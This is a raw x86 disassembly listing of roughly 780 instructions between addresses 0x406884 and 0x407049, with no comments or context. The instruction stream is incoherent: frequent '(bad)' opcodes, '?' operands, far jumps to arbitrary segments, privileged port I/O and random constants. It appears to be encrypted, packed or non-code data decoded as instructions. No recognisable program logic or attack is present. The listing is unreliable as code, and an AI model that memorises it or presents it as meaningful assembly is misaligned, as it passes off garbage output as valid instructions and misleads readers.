  406884:	push   cs
  406885:	add    al,0x60
  406887:	clc    
  406888:	mov    DWORD PTR fs:[ecx],eax
  40688b:	jl     0x406904
  40688d:	cmp    BYTE PTR [ebp+0x40],0x6b
  406891:	jb     0x4068e6
  406893:	sbb    ecx,DWORD PTR [ecx-0x413ec5c5]
  406899:	xlat   BYTE PTR ds:[ebx]
  40689a:	std    
  40689b:	lods   eax,DWORD PTR ds:[esi]
  40689c:	js     0x4068ca
  40689e:	mov    ?,WORD PTR [ecx+0x36]
  4068a1:	adc    eax,0x5a5997ad
  4068a6:	adc    ecx,DWORD PTR [ecx+ebx*8]
  4068a9:	std    
  4068aa:	push   es
  4068ab:	aaa    
  4068ac:	inc    ecx
  4068ad:	ret    0xb6fb
  4068b0:	clc    
  4068b1:	sbb    BYTE PTR [edx+0xd],cl
  4068b4:	mov    fs,WORD PTR [ecx-0x1e450eb6]
  4068ba:	or     al,0x86
  4068bc:	inc    esp
  4068bd:	loop   0x40689d
  4068bf:	add    bl,BYTE PTR [edx]
  4068c1:	loopne 0x40691b
  4068c3:	shl    DWORD PTR [ecx+0x3c],1
  4068c6:	nop
  4068c7:	(bad)  
  4068c8:	xchg   ebp,eax
  4068c9:	mov    dh,0xe0
  4068cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068cc:	pop    edi
  4068cd:	cli    
  4068ce:	fild   DWORD PTR [edi-0x4cea0ad7]
  4068d4:	iret   
  4068d5:	scas   eax,DWORD PTR es:[edi]
  4068d6:	mov    bl,0x4f
  4068d8:	out    0xc0,eax
  4068da:	jg     0x4068d7
  4068dc:	xchg   esp,eax
  4068dd:	out    0x37,al
  4068df:	daa    
  4068e0:	ja     0x406918
  4068e2:	lock xchg esp,eax
  4068e4:	repnz fs pop ss
  4068e7:	push   ebx
  4068e8:	jl     0x4068e2
  4068ea:	mov    edx,0x76cd296b
  4068ef:	dec    BYTE PTR [eax+0xfb565df]
  4068f5:	xchg   ebp,eax
  4068f6:	lock mov al,ds:0xa9477d92
  4068fc:	nop
  4068fd:	dec    edx
  4068fe:	retf   
  4068ff:	xor    BYTE PTR [ecx+0x26],dh
  406902:	pop    eax
  406903:	xchg   ah,bh
  406905:	xchg   ecx,eax
  406906:	jbe    0x4068da
  406908:	xchg   ebx,eax
  406909:	pop    edx
  40690a:	pop    ebx
  40690b:	test   al,0xd0
  40690d:	lea    ebx,[ecx-0x9]
  406910:	pop    ebp
  406911:	push   0x25302410
  406916:	mov    esi,0x15621d81
  40691b:	dec    ecx
  40691c:	push   ebx
  40691d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40691e:	ret    0xb84e
  406921:	cmp    eax,0x1778f5b9
  406926:	jmp    0xa52a:0x87c72e1c
  40692d:	add    DWORD PTR [esi-0x67d61882],edx
  406933:	je     0x4068cd
  406935:	push   0xffffff85
  406937:	imul   edi,ebp,0xa27dca49
  40693d:	(bad)  
  40693e:	ror    BYTE PTR [esi],1
  406940:	mov    ?,ebx
  406942:	xlat   BYTE PTR ds:[ebx]
  406943:	daa    
  406944:	sahf   
  406945:	mov    ecx,0x5846f207
  40694a:	mov    eax,0xb6fa2e52
  40694f:	stc    
  406950:	retf   0x4b5f
  406953:	jnp    0x40699a
  406955:	popa   
  406956:	pusha  
  406957:	stos   DWORD PTR es:[edi],eax
  406958:	(bad)  
  406959:	mov    ch,BYTE PTR [ecx+0x2c0b150e]
  40695f:	or     al,0x89
  406961:	retf   
  406962:	into   
  406963:	xor    eax,0xd9df2c9e
  406968:	lods   eax,DWORD PTR ds:[esi]
  406969:	mov    ecx,DWORD PTR [edi-0x15]
  40696c:	xchg   edi,eax
  40696d:	cld    
  40696e:	rcr    DWORD PTR [ebx+0x25],1
  406971:	fistp  QWORD PTR [edi]
  406973:	sti    
  406974:	call   0x671ec290
  406979:	retf   0x5a2
  40697c:	xchg   DWORD PTR [ecx+0x73],esi
  40697f:	stos   DWORD PTR es:[edi],eax
  406980:	fs lahf 
  406982:	jno    0x40694f
  406984:	add    DWORD PTR [ebx],esi
  406986:	shl    DWORD PTR [ebx+0x47],1
  406989:	push   esi
  40698a:	data16 (bad) 
  40698c:	mov    eax,0x66f5bf41
  406991:	cs stos DWORD PTR es:[edi],eax
  406993:	mov    eax,0xc7b6cb8f
  406998:	inc    ebp
  406999:	inc    esi
  40699a:	outs   dx,DWORD PTR ds:[esi]
  40699b:	iret   
  40699c:	mov    eax,ds:0x80be3cdb
  4069a1:	pop    ebx
  4069a2:	inc    ecx
  4069a3:	and    esi,DWORD PTR [esp+eax*8-0x15]
  4069a7:	in     al,0x22
  4069a9:	outs   dx,DWORD PTR ds:[esi]
  4069aa:	jo     0x406951
  4069ac:	loope  0x406967
  4069ae:	cmp    al,ch
  4069b0:	retf   0xe806
  4069b3:	mov    edx,0x4caf7cd3
  4069b8:	push   ebx
  4069b9:	sub    ebp,0x6f5e3849
  4069bf:	test   DWORD PTR ds:0x4d545a9e,ebp
  4069c5:	sbb    eax,0x99b44693
  4069ca:	sbb    ecx,edi
  4069cc:	or     ebp,DWORD PTR [ebp-0x749447df]
  4069d2:	mov    edi,0x9e70d510
  4069d7:	jae    0x406a46
  4069d9:	clc    
  4069da:	push   ss
  4069db:	daa    
  4069dc:	mov    BYTE PTR [edi-0x29b792a3],bl
  4069e2:	int    0x1f
  4069e4:	(bad)  
  4069e5:	fdivr  DWORD PTR [eax-0x25]
  4069e8:	std    
  4069e9:	sub    al,0x71
  4069eb:	xlat   BYTE PTR ds:[ebx]
  4069ed:	jle    0x4069cb
  4069ef:	mov    dl,0xa1
  4069f1:	aaa    
  4069f2:	(bad)  
  4069f3:	es xchg ecx,eax
  4069f5:	call   0x1dd2c32e
  4069fa:	into   
  4069fb:	cmp    al,0xcc
  4069fd:	sub    cl,al
  4069ff:	cmp    DWORD PTR [edx],esp
  406a01:	xchg   esi,eax
  406a02:	(bad)
  406a05:	shr    DWORD PTR [ebx],0xa
  406a08:	jbe    0x4069ed
  406a0a:	sar    BYTE PTR [edx+ebp*8-0x277403a1],1
  406a11:	and    DWORD PTR [eax+0x4073b02c],esi
  406a17:	xchg   BYTE PTR [edx+eiz*2-0x2b],bl
  406a1b:	xchg   ebx,eax
  406a1c:	push   0x57
  406a1e:	fwait
  406a1f:	aas    
  406a20:	mov    eax,0x751c5306
  406a25:	or     ebp,DWORD PTR [edi+0x5ecd5d79]
  406a2b:	mov    esi,ebx
  406a2d:	mov    bh,0x2b
  406a2f:	sbb    DWORD PTR [esi],ebp
  406a31:	lahf   
  406a32:	int3   
  406a33:	jle    0x406a31
  406a35:	xchg   ecx,eax
  406a36:	mov    edx,0xbf3dc261
  406a3b:	das    
  406a3c:	xchg   BYTE PTR [edi],bh
  406a3e:	mov    BYTE PTR [edx],dl
  406a40:	push   es
  406a41:	and    edx,DWORD PTR [ebp-0x6]
  406a44:	or     DWORD PTR [ecx],esp
  406a46:	jmp    0xcbb4:0x5c2e1f2e
  406a4d:	push   0xe84e9432
  406a52:	sbb    ebx,esi
  406a54:	ins    DWORD PTR es:[edi],dx
  406a55:	ret    
  406a56:	dec    ebx
  406a57:	iret   
  406a58:	jmp    0x406a62
  406a5a:	add    ch,BYTE PTR [eax+0x11946493]
  406a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a61:	lahf   
  406a62:	rol    BYTE PTR [esi],0x3b
  406a65:	enter  0xac12,0x35
  406a69:	and    al,0x9d
  406a6b:	pushf  
  406a6c:	(bad)  
  406a6d:	mov    eax,0x9cf9a00
  406a72:	pop    ebp
  406a73:	cmp    dh,BYTE PTR ds:0xb7e9a8c7
  406a79:	sbb    bl,BYTE PTR [edx+0x26]
  406a7c:	stos   DWORD PTR es:[edi],eax
  406a7d:	ss scas al,BYTE PTR es:[edi]
  406a7f:	pop    eax
  406a80:	mov    ebp,0xe0d76cee
  406a85:	or     DWORD PTR [eax+0x76],eax
  406a88:	pop    es
  406a89:	xchg   ebx,eax
  406a8a:	pushf  
  406a8b:	and    ebx,edx
  406a8d:	mov    dh,BYTE PTR [edi]
  406a8f:	sbb    al,0x3d
  406a91:	cmp    eax,0xe861d302
  406a96:	sub    eax,0x93c9aa55
  406a9b:	aas    
  406a9c:	fs or  al,0xb8
  406a9f:	jne    0x406aaf
  406aa1:	mov    esp,0xfee5a9b7
  406aa6:	lds    esp,FWORD PTR [edx]
  406aa8:	add    BYTE PTR [eax+edi*8-0x9],0x80
  406aad:	call   0x6818957f
  406ab2:	je     0x406ac9
  406ab4:	(bad)  
  406ab5:	in     al,dx
  406ab6:	loopne 0x406ab0
  406ab8:	pop    eax
  406ab9:	mov    al,ds:0x32cc2172
  406abe:	icebp  
  406abf:	mov    ds:0xf686869b,al
  406ac4:	outs   dx,BYTE PTR ds:[esi]
  406ac5:	mov    ah,0x40
  406ac7:	cmc    
  406ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ac9:	ror    edi,1
  406acb:	xchg   ebx,eax
  406acc:	jno    0x406b0b
  406ace:	lea    edi,[ebp+ecx*1-0x5d]
  406ad2:	sar    DWORD PTR [esi+0x7be1952],cl
  406ad8:	mov    DWORD PTR [edi+0x26],0xbad17562
  406adf:	std    
  406ae0:	mov    cl,0x4
  406ae2:	jns    0x406a69
  406ae4:	push   cs
  406ae5:	iret   
  406ae6:	test   eax,0xd3a691c
  406aeb:	ror    edx,cl
  406aed:	icebp  
  406aee:	retf   
  406aef:	mov    ss,WORD PTR [ebp-0x44]
  406af2:	push   ds
  406af3:	ins    DWORD PTR es:[edi],dx
  406af4:	mov    al,0x18
  406af6:	dec    edi
  406af7:	xor    eax,esi
  406af9:	cmp    al,0x21
  406afb:	jno    0x406a88
  406afd:	cs push ds
  406aff:	imul   edx,ebx,0x57cfab43
  406b05:	jmp    DWORD PTR cs:[ebx]
  406b08:	add    edi,ebp
  406b0a:	call   0x363b2821
  406b0f:	das    
  406b10:	sti    
  406b11:	retf   
  406b12:	lods   al,BYTE PTR ds:[esi]
  406b13:	out    dx,eax
  406b14:	or     al,0x9
  406b16:	mov    DWORD PTR [si],ecx
  406b19:	(bad)  
  406b1a:	cmp    eax,0xe3280d93
  406b1f:	mov    ebp,0xafbbd140
  406b24:	test   al,0x86
  406b26:	dec    eax
  406b27:	loope  0x406adc
  406b29:	mov    ebp,0xb497d7f8
  406b2e:	add    eax,0xfa0979f4
  406b33:	leave  
  406b34:	dec    esi
  406b35:	fistp  QWORD PTR [edi-0x4392ec96]
  406b3b:	out    dx,al
  406b3c:	in     eax,dx
  406b3d:	and    al,0x27
  406b3f:	cmp    eax,0x5291fe49
  406b44:	ja     0x406b9b
  406b46:	cmp    DWORD PTR [esi],0x68a8430e
  406b4c:	into   
  406b4d:	mov    al,ds:0xf52babae
  406b52:	loop   0x406b56
  406b54:	push   ss
  406b55:	pop    ebx
  406b56:	dec    ebp
  406b57:	bound  esp,QWORD PTR ds:0xcd7e0876
  406b5d:	pushf  
  406b5e:	out    0xe6,eax
  406b60:	jae    0x406b12
  406b62:	call   DWORD PTR [ecx]
  406b64:	pop    ss
  406b65:	test   BYTE PTR [edx+0x3],ch
  406b68:	xor    dh,ah
  406b6a:	ror    BYTE PTR [ebp-0x78],cl
  406b6d:	mov    ebp,0x7becabeb
  406b72:	pop    ss
  406b73:	pop    eax
  406b74:	lea    esp,[esi+0x4c]
  406b77:	mov    gs,WORD PTR ss:[edi+0x220cc4df]
  406b7e:	push   eax
  406b7f:	repnz popa 
  406b81:	mov    bl,0x14
  406b83:	pop    esp
  406b84:	sbb    DWORD PTR [ebp+0x1c],0x44
  406b88:	jae    0x406b24
  406b8a:	jp     0x406b79
  406b8c:	jnp    0x406be1
  406b8e:	jae    0x406bf9
  406b90:	ficom  WORD PTR ds:0x11f5fbaf
  406b96:	ds repz sbb al,0x0
  406b9a:	inc    ebp
  406b9b:	mov    ebp,edi
  406b9d:	sti    
  406b9e:	add    DWORD PTR [ebp-0xac4460],edi
  406ba4:	adc    al,0xd2
  406ba6:	neg    BYTE PTR [ecx-0x39fdaf06]
  406bac:	and    esi,DWORD PTR [ebx+ebp*8]
  406baf:	sbb    BYTE PTR [ebp+esi*1+0x23],bh
  406bb3:	arpl   WORD PTR [eax],cx
  406bb5:	mov    dh,0x37
  406bb7:	ins    DWORD PTR es:[edi],dx
  406bb8:	in     eax,0x48
  406bba:	xor    eax,0xa1ca0e03
  406bbf:	xlat   BYTE PTR ds:[ebx]
  406bc0:	aam    0x4d
  406bc2:	sbb    al,0x7d
  406bc4:	sbb    bh,BYTE PTR [ecx+0x531b6bd]
  406bca:	leave  
  406bcb:	xchg   edx,eax
  406bcc:	add    al,0x5c
  406bce:	aad    0xc5
  406bd0:	into   
  406bd1:	pop    ss
  406bd2:	int    0xf0
  406bd4:	lods   al,BYTE PTR ds:[esi]
  406bd5:	mov    eax,DWORD PTR [edx]
  406bd7:	mov    ds:0x9bb69b59,al
  406bdc:	ret    0x1852
  406bdf:	cmp    ebx,DWORD PTR [ebp+0x5fdf9dc4]
  406be5:	outs   dx,DWORD PTR ds:[esi]
  406be6:	push   edi
  406be7:	mov    edx,0x4f6361b8
  406bec:	cmp    eax,0x4ecf32af
  406bf1:	push   cs
  406bf2:	pushf  
  406bf3:	into   
  406bf4:	call   0x1e0d6605
  406bf9:	cmc    
  406bfa:	adc    BYTE PTR [ecx+0x5e],ah
  406bfd:	mov    esi,0xb81eecb6
  406c02:	int    0x96
  406c04:	mov    eax,ds:0x92e6e3fb
  406c09:	dec    edx
  406c0a:	adc    DWORD PTR [ebx-0x4de82342],0x74
  406c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c12:	mov    ebp,0xd201c74d
  406c17:	gs jp  0x406c48
  406c1a:	mov    bh,0xac
  406c1c:	mov    eax,0x925cf11a
  406c21:	dec    ebx
  406c22:	sub    BYTE PTR [eax-0x77047a7d],ch
  406c28:	adc    al,0xe2
  406c2a:	cs pusha 
  406c2c:	ins    DWORD PTR es:[edi],dx
  406c2d:	dec    eax
  406c2e:	mov    ds:0x6f169a87,al
  406c33:	or     eax,0x4aace4cb
  406c38:	call   0xab2c632f
  406c3d:	fsub   QWORD PTR [edx+eax*1]
  406c40:	jge    0x406c96
  406c42:	faddp  st(2),st
  406c44:	inc    esi
  406c45:	xchg   ecx,eax
  406c46:	sub    dl,BYTE PTR [edx+0x4d23096b]
  406c4c:	sar    BYTE PTR [ebx+edx*2],cl
  406c4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c50:	xor    eax,0x28c9b813
  406c55:	call   0xffb98d8c
  406c5a:	retf   
  406c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5c:	mov    cl,0xcd
  406c5e:	xor    eax,0x3be97206
  406c63:	add    bh,BYTE PTR [ecx+0x41]
  406c66:	xor    eax,0xed9a7b05
  406c6b:	jae    0x406c42
  406c6d:	xchg   BYTE PTR [ecx+0x7c],al
  406c70:	rcl    BYTE PTR [edx],0x35
  406c73:	or     DWORD PTR [ebx-0x24924bed],0xffffffb9
  406c7a:	xchg   BYTE PTR [eax],al
  406c7c:	scas   eax,DWORD PTR es:[edi]
  406c7d:	jmp    0x68cd39a4
  406c82:	jecxz  0x406c3c
  406c84:	data16 in al,dx
  406c86:	pop    ebp
  406c87:	push   ecx
  406c88:	dec    edi
  406c89:	adc    BYTE PTR [eax+0x2b2cce67],al
  406c8f:	mov    ebp,0x8ba67711
  406c94:	inc    esp
  406c95:	pushf  
  406c96:	push   ss
  406c97:	xchg   ecx,eax
  406c98:	jb     0x406cac
  406c9a:	mov    ch,0x8c
  406c9c:	popa   
  406c9d:	out    dx,al
  406c9e:	add    BYTE PTR [ecx+0x6e],al
  406ca1:	xor    eax,0xe2232c10
  406ca6:	nop
  406ca7:	mov    edi,0x91233606
  406cac:	sbb    ah,BYTE PTR [esi]
  406cae:	xchg   ch,cl
  406cb0:	repnz sub al,ch
  406cb3:	cmp    eax,0x9ecac380
  406cb8:	out    0xb2,al
  406cba:	dec    ebp
  406cbb:	mov    bl,0x67
  406cbd:	inc    bx
  406cbf:	js     0x406c99
  406cc1:	pop    ebp
  406cc2:	xchg   esp,eax
  406cc3:	popf   
  406cc4:	les    esp,FWORD PTR ds:0xc112d879
  406cca:	lods   al,BYTE PTR ds:[esi]
  406ccb:	stc    
  406ccc:	jns    0x406c6a
  406cce:	imul   edi,ebx,0xffffffd9
  406cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd2:	mov    edi,0x6bc11e32
  406cd7:	cwde   
  406cd8:	int    0xd1
  406cda:	dec    edx
  406cdb:	inc    esi
  406cdc:	adc    BYTE PTR [esi+0x795bf9cf],dl
  406ce2:	lock aaa 
  406ce4:	or     cl,BYTE PTR [esi+eax*4+0x2396325]
  406ceb:	mov    eax,ds:0x59fb810a
  406cf0:	int    0xd3
  406cf2:	std    
  406cf3:	sbb    cl,BYTE PTR [eax-0xa5dc36d]
  406cf9:	mov    ebx,0xef3f50d9
  406cfe:	mov    cl,BYTE PTR [edi+0x17]
  406d01:	mov    ebx,0xaf06e39
  406d06:	push   0xfffffffd
  406d08:	adc    eax,0x286a1635
  406d0d:	sub    ebp,DWORD PTR [eax]
  406d0f:	or     al,0x6e
  406d11:	xchg   edx,eax
  406d12:	shl    dl,cl
  406d14:	and    DWORD PTR [ebx+ebx*8+0x9342838],eax
  406d1b:	add    al,0x78
  406d1d:	fdivr  QWORD PTR [edx]
  406d1f:	(bad)  
  406d20:	cs mov ah,0xaf
  406d23:	in     eax,0x31
  406d25:	xor    al,0x83
  406d27:	and    BYTE PTR [edi+0x730e97d4],0x3a
  406d2e:	push   eax
  406d2f:	cmp    al,0x9
  406d31:	ds push eax
  406d33:	sbb    ecx,DWORD PTR [edi+0x1ce58234]
  406d39:	jp     0x406d78
  406d3b:	fiadd  WORD PTR [edi+0x7f17d74d]
  406d41:	sub    DWORD PTR [ebp+0x7e712112],ecx
  406d47:	je     0x406d29
  406d49:	push   0x7
  406d4b:	(bad)  
  406d4c:	je     0x406ce2
  406d4e:	jmp    0x1cad:0x67cd2578
  406d55:	xor    edx,DWORD PTR ds:0xee01bda5
  406d5b:	lahf   
  406d5c:	jns    0x406dc0
  406d5e:	and    dh,bl
  406d60:	pop    ecx
  406d61:	or     al,0x7c
  406d63:	loopne 0x406dc7
  406d65:	fnstcw WORD PTR [edi+0x2fe1125b]
  406d6b:	add    al,0x72
  406d6d:	sbb    BYTE PTR [esi],ch
  406d6f:	dec    esp
  406d70:	(bad)  
  406d71:	pusha  
  406d72:	sbb    DWORD PTR [ecx-0x14],edi
  406d75:	xchg   ecx,eax
  406d76:	(bad)  
  406d77:	jne    0x406d0a
  406d79:	sbb    esi,esp
  406d7b:	inc    ebp
  406d7c:	xchg   esi,eax
  406d7d:	dec    edx
  406d7e:	cwde   
  406d7f:	lahf   
  406d80:	das    
  406d81:	adc    esp,esp
  406d83:	sti    
  406d84:	ins    BYTE PTR es:[edi],dx
  406d85:	inc    esi
  406d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d87:	add    al,0x41
  406d89:	push   es
  406d8a:	int3   
  406d8b:	aaa    
  406d8c:	jmp    0xcac8b4a0
  406d91:	sbb    al,0x52
  406d93:	sub    BYTE PTR [eax-0x62],0x5a
  406d97:	(bad)  
  406d98:	neg    BYTE PTR [edx+0x35b7137e]
  406d9e:	and    bh,bl
  406da0:	clc    
  406da1:	imul   esp,ecx,0xdbcc78e3
  406da7:	aaa    
  406da8:	ficom  WORD PTR ds:0x9b7927c5
  406dae:	les    eax,FWORD PTR [esp+ebx*2]
  406db1:	jge    0x406d3d
  406db3:	and    al,0x3e
  406db5:	test   eax,ebp
  406db7:	hlt    
  406db8:	xor    eax,DWORD PTR [ebp+0x1]
  406dbb:	retf   0x2c18
  406dbe:	or     ah,BYTE PTR [ebx-0x521331a6]
  406dc4:	shl    DWORD PTR ds:0xf76ed6f5,cl
  406dca:	fist   WORD PTR [ebp+esi*2+0x45c5747a]
  406dd1:	mov    dl,bh
  406dd3:	add    al,0xff
  406dd5:	xor    DWORD PTR [edi-0x76d1a456],edi
  406ddb:	adc    al,ch
  406ddd:	gs xor eax,0x43c60a36
  406de3:	push   ebp
  406de4:	in     eax,dx
  406de5:	das    
  406de6:	push   eax
  406de7:	dec    edx
  406de8:	and    al,BYTE PTR [ebx-0x522837fc]
  406dee:	dec    ebp
  406def:	xor    ebp,ecx
  406df1:	in     al,dx
  406df2:	ss ret 0x114f
  406df6:	inc    eax
  406df7:	in     eax,dx
  406df8:	(bad)  
  406df9:	and    edx,esp
  406dfb:	dec    esi
  406dfc:	dec    esi
  406dfd:	add    eax,0x397bf47
  406e02:	test   al,0x55
  406e04:	jecxz  0x406db6
  406e06:	and    BYTE PTR [esi-0x6a],al
  406e09:	out    0x16,eax
  406e0b:	lock repz sbb al,0x11
  406e0f:	dec    edx
  406e10:	stc    
  406e11:	fcmovnbe st,st(7)
  406e13:	fwait
  406e14:	push   ebp
  406e15:	in     eax,0x12
  406e17:	jecxz  0x406e60
  406e19:	or     al,0xac
  406e1b:	outs   dx,DWORD PTR ss:[esi]
  406e1d:	mov    cs,edi
  406e1f:	jne    0x406e35
  406e21:	(bad)  
  406e22:	into   
  406e23:	loop   0x406e7c
  406e25:	stc    
  406e26:	inc    eax
  406e27:	jns    0x406e4f
  406e29:	push   edx
  406e2a:	cmp    BYTE PTR [esi+ebp*4+0x5da519ad],0x40
  406e32:	ins    BYTE PTR es:[edi],dx
  406e33:	aas    
  406e34:	mov    ah,0x2
  406e36:	add    DWORD PTR [ecx-0x6e3c71ef],ecx
  406e3c:	cmp    BYTE PTR [esi-0x1bd852e7],al
  406e42:	dec    esp
  406e43:	add    eax,0xc5e0d8d
  406e48:	and    edx,DWORD PTR [ebx-0x23]
  406e4b:	mov    ecx,0xdf185e11
  406e50:	idiv   BYTE PTR [eax+0x69]
  406e53:	pop    ebx
  406e54:	addr16 mov ebx,0xf9e95e14
  406e5a:	fld    DWORD PTR [eax+edi*4]
  406e5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e5e:	(bad)  
  406e5f:	(bad)  
  406e60:	enter  0xd04b,0x8
  406e64:	jle    0x406e6c
  406e66:	loopne 0x406ea6
  406e68:	sar    BYTE PTR [edi-0x17],cl
  406e6b:	ds js  0x406ea7
  406e6e:	cmp    esi,esp
  406e70:	scas   eax,DWORD PTR es:[edi]
  406e71:	push   esi
  406e72:	inc    edi
  406e73:	aad    0x2d
  406e75:	and    esp,DWORD PTR [eax+0x2a0e2305]
  406e7b:	shl    DWORD PTR [esi+0x298a2bad],cl
  406e81:	inc    edi
  406e82:	pop    ebp
  406e83:	push   ss
  406e84:	call   0x34a4:0x28c5eb17
  406e8b:	add    al,0x26
  406e8d:	je     0x406e44
  406e8f:	ja     0x406e52
  406e91:	sti    
  406e92:	(bad)  
  406e93:	xor    DWORD PTR [esi],edi
  406e95:	or     al,0xda
  406e97:	arpl   WORD PTR [ecx-0x54],sp
  406e9a:	adc    BYTE PTR [esi],cl
  406e9c:	(bad)  
  406e9d:	push   eax
  406e9e:	dec    eax
  406e9f:	cmp    BYTE PTR [ecx],bl
  406ea1:	ret    
  406ea2:	xor    dl,BYTE PTR [edx+ecx*1-0x229d55cb]
  406ea9:	lahf   
  406eaa:	shl    BYTE PTR [ebp-0x166febb6],1
  406eb0:	stc    
  406eb1:	and    BYTE PTR [edi],dh
  406eb3:	shl    DWORD PTR [eax],0xc4
  406eb6:	call   0xdfb02762
  406ebb:	test   edx,ebx
  406ebd:	lds    esp,FWORD PTR [edi]
  406ebf:	scas   al,BYTE PTR es:[edi]
  406ec0:	ret    
  406ec1:	rcl    DWORD PTR [edi+0x51],1
  406ec4:	adc    al,0xc1
  406ec6:	push   edi
  406ec7:	cwde   
  406ec8:	mov    bh,0x2f
  406eca:	ja     0x406e7c
  406ecc:	xchg   ebx,eax
  406ecd:	mov    ds:0x93e5ad3c,al
  406ed2:	test   eax,0x2c9bee3a
  406ed7:	pop    edi
  406ed8:	rcr    BYTE PTR [ebp+0x48],0xab
  406edc:	fild   WORD PTR [edx+0x11b1755e]
  406ee2:	add    bh,BYTE PTR [ebp-0x5c]
  406ee5:	xor    ecx,edx
  406ee7:	out    dx,al
  406ee8:	push   0x5b
  406eea:	jmp    0x406f24
  406eec:	(bad)  
  406eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eee:	fimul  WORD PTR [edx-0x42]
  406ef1:	out    0xf0,eax
  406ef3:	xor    eax,esi
  406ef5:	cmp    al,0xf0
  406ef7:	and    dh,al
  406ef9:	call   FWORD PTR [esi]
  406efb:	pinsrw mm0,esi,0xac
  406eff:	push   cs
  406f00:	in     eax,dx
  406f01:	loopne 0x406eea
  406f03:	aas    
  406f04:	std    
  406f05:	mov    al,0x66
  406f07:	push   ss
  406f08:	adc    bl,BYTE PTR [ecx]
  406f0a:	pop    eax
  406f0b:	fs lahf 
  406f0d:	aas    
  406f0e:	or     al,BYTE PTR [ecx+0x3a]
  406f11:	jne    0x406f7e
  406f13:	xchg   DWORD PTR [ecx+0x0],ecx
  406f16:	adc    al,0x5d
  406f18:	push   0x20f9840a
  406f1d:	dec    esi
  406f1e:	pop    esi
  406f1f:	loop   0x406f99
  406f21:	repz iret 
  406f23:	cmp    cl,ah
  406f25:	and    DWORD PTR [edi],ebp
  406f27:	cs in  eax,0x54
  406f2a:	enter  0xf816,0x10
  406f2e:	dec    ebp
  406f2f:	mov    BYTE PTR [ebx-0x64],al
  406f32:	sar    DWORD PTR [esp+esi*8+0x52],cl
  406f36:	shl    BYTE PTR [ebx+edx*1-0x6cba6258],cl
  406f3d:	mov    ds:0xd7c31782,eax
  406f42:	daa    
  406f43:	(bad)  
  406f44:	call   0x13fd:0xd756f101
  406f4b:	ret    0xc507
  406f4e:	inc    eax
  406f4f:	push   ecx
  406f50:	dec    ebp
  406f51:	mov    al,ds:0x8e0fbed9
  406f56:	lahf   
  406f57:	mov    WORD PTR [edx],?
  406f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f5a:	and    BYTE PTR [edx+0x4],bh
  406f5d:	in     eax,dx
  406f5e:	mov    BYTE PTR [eax+eiz*4+0x3d6679d5],0x3c
  406f66:	dec    ebx
  406f67:	and    esp,DWORD PTR [ecx+0x273b13c6]
  406f6d:	lahf   
  406f6e:	adc    eax,0xfc25a292
  406f73:	jmp    0x406f4c
  406f75:	sub    al,BYTE PTR [edx-0x25]
  406f78:	add    ebx,DWORD PTR [esi-0x625eece1]
  406f7e:	mov    esp,0x1f11c4d1
  406f83:	or     BYTE PTR [eax+eiz*1+0x27],bh
  406f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f88:	repnz mov ah,0x74
  406f8b:	fcom   QWORD PTR [edi+0x57]
  406f8e:	scas   al,BYTE PTR es:[edi]
  406f8f:	sbb    cl,BYTE PTR [ebx+0x75]
  406f92:	inc    ebp
  406f93:	clc    
  406f94:	jle    0x406f59
  406f96:	jno    0x40700f
  406f98:	outs   dx,DWORD PTR ds:[esi]
  406f99:	(bad)
  406f9d:	xor    ebx,eax
  406f9f:	outs   dx,DWORD PTR ds:[esi]
  406fa0:	pop    edx
  406fa1:	inc    edx
  406fa2:	jg     0x407002
  406fa4:	inc    esi
  406fa5:	cs in  al,dx
  406fa7:	shl    DWORD PTR [ecx+0x1],0x51
  406fab:	mov    cl,ah
  406fad:	push   ebx
  406fae:	pop    es
  406faf:	mov    esi,0xdc17b460
  406fb4:	sbb    al,0x7a
  406fb6:	push   ss
  406fb7:	fs jns 0x406fb0
  406fba:	ss inc esi
  406fbc:	loop   0x40700d
  406fbe:	push   0xffffffec
  406fc0:	push   ebp
  406fc1:	push   ecx
  406fc2:	lds    edi,FWORD PTR [ecx+0x78]
  406fc5:	inc    esp
  406fc6:	shl    BYTE PTR [eax+0xd8bb53c],cl
  406fcc:	push   ds
  406fcd:	neg    DWORD PTR [eax+eiz*4-0x3304b841]
  406fd4:	div    BYTE PTR [edx-0x703bdc46]
  406fda:	popf   
  406fdb:	jmp    0x683139c8
  406fe0:	and    eax,ebp
  406fe2:	cmp    DWORD PTR [edx-0x40],edi
  406fe5:	jl     0x406fe2
  406fe7:	aad    0x83
  406fe9:	xlat   BYTE PTR ds:[ebx]
  406fea:	xchg   bh,cl
  406fec:	ins    DWORD PTR es:[edi],dx
  406fed:	repnz std 
  406fef:	imul   edx,DWORD PTR [ebp+eax*2+0x5df173aa],0x7b799fec
  406ffa:	xchg   esp,eax
  406ffb:	or     ebp,esp
  406ffd:	pop    esp
  406ffe:	and    al,0xe6
  407000:	mov    ah,0x91
  407002:	das    
  407003:	push   ss
  407004:	mov    ebp,0x6494d06c
  407009:	fdivr  QWORD PTR [ebx-0x6dda25ff]
  40700f:	dec    edx
  407010:	lahf   
  407011:	sbb    ch,BYTE PTR [ebx-0x1f]
  407014:	xchg   DWORD PTR [ecx-0x32bc4974],ebx
  40701a:	cmp    BYTE PTR [edi],dh
  40701c:	pop    esp
  40701d:	out    dx,eax
  40701e:	mul    BYTE PTR [edi-0x9aa9956]
  407024:	adc    dl,BYTE PTR [eax+0xf1a55f7]
  40702a:	lock push ss
  40702c:	xchg   BYTE PTR [edi],ch
  40702e:	sbb    al,0xdd
  407030:	jmp    0x22f1:0x7b51e533
  407037:	(bad)  
  407038:	int    0xf2
  40703a:	ins    DWORD PTR es:[edi],dx
  40703b:	jbe    0x406fee
  40703d:	or     eax,0x26ae87c8
  407042:	jmp    0x4070c2
  407044:	(bad)
  407047:	xchg   esp,eax
  407048:	xchg   edx,eax
  407049:	jo     0x406fe8
